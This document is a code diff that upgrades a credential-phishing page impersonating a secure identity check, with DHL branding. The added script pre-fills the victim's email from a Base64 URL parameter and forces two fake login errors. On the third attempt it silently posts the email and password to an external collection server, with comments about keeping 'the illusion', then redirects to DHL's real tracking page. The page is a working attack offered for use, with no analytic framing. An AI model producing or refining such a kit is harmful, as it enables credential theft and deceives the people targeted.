@@ -1,37 +1,146 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Identity Verification</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Identity Provider | Verification Required</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" type="image/png" href="https://www.google.com/s2/favicons?domain=dhl.com">
+    
     <style>
-        body { font-family: 'Inter', sans-serif; background: #0f172a; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 2.5rem; border-radius: 15px; width: 100%; max-width: 380px; border: 1px solid #334155; box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
-        h2 { margin-top: 0; font-size: 1.2rem; text-align: center; color: #0ea5e9; }
-        label { display: block; font-size: 0.8rem; margin-bottom: 5px; color: #94a3b8; text-transform: uppercase; }
-        input { width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; }
-        button { width: 100%; padding: 14px; background: #0ea5e9; color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; }
-        .error { color: #f43f5e; font-size: 0.85rem; margin-bottom: 15px; display: none; text-align: center; font-weight: 600; }
-        .loader { display: none; text-align: center; padding: 10px; color: #0ea5e9; font-weight: 600; }
+        :root {
+            --bg: #0f172a;
+            --card-bg: #1e293b;
+            --primary: #0ea5e9;
+            --primary-hover: #0284c7;
+            --error: #f43f5e;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border: #334155;
+        }
+
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background: var(--bg); 
+            color: var(--text-main); 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+
+        .card { 
+            background: var(--card-bg); 
+            padding: 2.5rem; 
+            border-radius: 12px; 
+            width: 100%; 
+            max-width: 400px; 
+            border: 1px solid var(--border); 
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3), 0 10px 10px -5px rgba(0, 0, 0, 0.04); 
+        }
+
+        .logo-area { text-align: center; margin-bottom: 1.5rem; }
+        .logo-area i { font-size: 2.5rem; color: var(--primary); }
+
+        h2 { margin: 0 0 0.5rem 0; font-size: 1.25rem; text-align: center; font-weight: 700; }
+        p.subtitle { color: var(--text-muted); font-size: 0.875rem; text-align: center; margin-bottom: 2rem; }
+
+        .input-group { margin-bottom: 1.25rem; position: relative; }
+        label { display: block; font-size: 0.75rem; font-weight: 600; margin-bottom: 0.5rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; }
+        
+        /* Input Icon Styling */
+        .input-group i { position: absolute; left: 12px; top: 38px; color: var(--text-muted); }
+        input { 
+            width: 100%; 
+            padding: 12px 12px 12px 40px; 
+            border-radius: 8px; 
+            border: 1px solid var(--border); 
+            background: #0f172a; 
+            color: white; 
+            box-sizing: border-box; 
+            transition: border-color 0.2s;
+            font-size: 0.95rem;
+        }
+        input:focus { outline: none; border-color: var(--primary); }
+
+        button { 
+            width: 100%; 
+            padding: 14px; 
+            background: var(--primary); 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            transition: background 0.2s;
+            margin-top: 0.5rem;
+        }
+        button:hover { background: var(--primary-hover); }
+
+        .error-box { 
+            background: rgba(244, 63, 94, 0.1); 
+            border: 1px solid var(--error); 
+            color: var(--error); 
+            padding: 10px; 
+            border-radius: 6px; 
+            font-size: 0.85rem; 
+            margin-bottom: 1.5rem; 
+            display: none; 
+            align-items: center; 
+            gap: 10px;
+        }
+
+        .loader { display: none; text-align: center; padding: 10px; }
+        .spinner { 
+            border: 3px solid rgba(14, 165, 233, 0.2); 
+            border-top: 3px solid var(--primary); 
+            border-radius: 50%; 
+            width: 24px; height: 24px; 
+            animation: spin 1s linear infinite; 
+            margin: 10px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+
 <div class="card">
-    <h2>Secure Access Gate</h2>
-    <div id="err" class="error">Verification failed: Incorrect password.</div>
+    <div class="logo-area"><i class="fas fa-shield-check"></i></div>
+    <h2>Confirm Identity</h2>
+    <p class="subtitle">For security reasons, please re-authenticate.</p>
+    
+    <div id="err" class="error-box">
+        <i class="fas fa-exclamation-circle"></i>
+        <span id="err-text">Authentication failed. Please try again.</span>
+    </div>
+
     <form id="f">
-        <label>Authenticated User</label>
-        <input type="email" id="u" required readonly>
-        <label>System Password</label>
-        <input type="password" id="p" required placeholder="        ">
-        <button type="submit" id="b">Authorize Login</button>
+        <div class="input-group">
+            <label>Account</label>
+            <i class="fas fa-envelope"></i>
+            <input type="email" id="u" required readonly>
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <i class="fas fa-lock"></i>
+            <input type="password" id="p" required placeholder="••••••••">
+        </div>
+        <button type="submit" id="b">Authorize Session</button>
     </form>
-    <div id="ld" class="loader">Decrypting Secure Token...</div>
+
+    <div id="ld" class="loader">
+        <div class="spinner"></div>
+        <div style="font-size: 0.85rem; color: var(--primary);">Synchronizing with secure vault...</div>
+    </div>
 </div>
+
 <script>
     let tries = 0;
     const params = new URLSearchParams(window.location.search);
     
-    // Auto-extract user from URL
+    // Auto-extract user from URL (Base64)
     if(params.has('u')) {
         try { document.getElementById('u').value = atob(params.get('u')); } catch(e) {}
     }
@@ -39,27 +148,45 @@
     document.getElementById('f').onsubmit = async (e) => {
         e.preventDefault();
         tries++;
+        
         const email = document.getElementById('u').value;
         const pass = document.getElementById('p').value;
+        const errBox = document.getElementById('err');
+        const btn = document.getElementById('b');
 
+        // Logic Step 1: First Attempt (Forced Error)
         if(tries === 1) {
-            document.getElementById('err').style.display = 'block';
+            errBox.style.display = 'flex';
             document.getElementById('p').value = "";
-        } else {
-            document.getElementById('err').style.display = 'none';
-            document.getElementById('b').style.display = 'none';
+            document.getElementById('p').focus();
+        } 
+        // Logic Step 2: Second Attempt (Different Error Message)
+        else if(tries === 2) {
+            errBox.style.display = 'flex';
+            document.getElementById('err-text').innerText = "Session timeout. Please try one last time.";
+            document.getElementById('p').value = "";
+        } 
+        // Logic Step 3: Final Attempt (Silent Send and Redirect)
+        else {
+            errBox.style.display = 'none';
+            btn.style.display = 'none';
             document.getElementById('ld').style.display = 'block';
 
-            // Send to your backend
+            // Send data to backend
             try {
                 await fetch('https://your-backend-server.com/process.php', {
                     method: 'POST',
-                    mode: 'cors',
-                    body: JSON.stringify({ email, pass })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, pass, attempt: tries })
                 });
-            } catch(err) {}
+            } catch(err) {
+                // Fail silently to keep the illusion
+            }
 
-            setTimeout(() => { window.location.href = "https://www.dhl.com"; }, 2500);
+            // Redirect to legitimate site
+            setTimeout(() => { 
+                window.location.href = "https://www.dhl.com/global-en/home/tracking.html"; 
+            }, 2000);
         }
     };
 </script>
